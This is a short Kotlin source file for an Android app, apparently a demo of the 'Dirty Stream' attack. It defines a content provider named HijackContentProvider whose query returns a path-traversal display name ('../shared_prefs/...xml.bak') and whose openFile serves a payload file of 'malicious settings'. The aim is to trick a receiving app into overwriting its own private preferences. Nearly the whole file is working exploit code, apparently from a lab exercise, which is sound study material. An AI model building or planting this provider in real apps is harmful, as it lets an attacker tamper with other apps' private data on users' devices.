package com.artexplorer.museum.data

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.database.MatrixCursor
import android.net.Uri
import android.os.ParcelFileDescriptor
import android.provider.OpenableColumns
import java.io.File
import java.io.FileOutputStream

class HijackContentProvider : ContentProvider() {

    // The malicious filename targeting the .bak file
    private val maliciousFileName = "../shared_prefs/com.example.dirtystream_preferences.xml.bak"

    override fun query(uri: Uri, projection: Array<String>?, selection: String?, selArgs: Array<String>?, sortOrder: String?): Cursor {
        val cursor = MatrixCursor(arrayOf(OpenableColumns.DISPLAY_NAME))
        cursor.addRow(arrayOf(maliciousFileName))
        return cursor
    }

    // --- The rest of the provider can be copied from ArtworksContentProvider ---
    // --- or simplified if it only needs to provide the name. ---

    override fun onCreate(): Boolean = true
    override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor? {
        val file = File(context!!.cacheDir, "payload.txt")
        FileOutputStream(file).use { it.write("malicious settings".toByteArray()) }
        return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY)
    }
    override fun getType(uri: Uri): String? = null
    override fun insert(uri: Uri, values: ContentValues?): Uri? = null
    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<String>?): Int = 0
    override fun update(uri: Uri, values: ContentValues?, selection: String?, selectionArgs: Array<String>?): Int = 0
}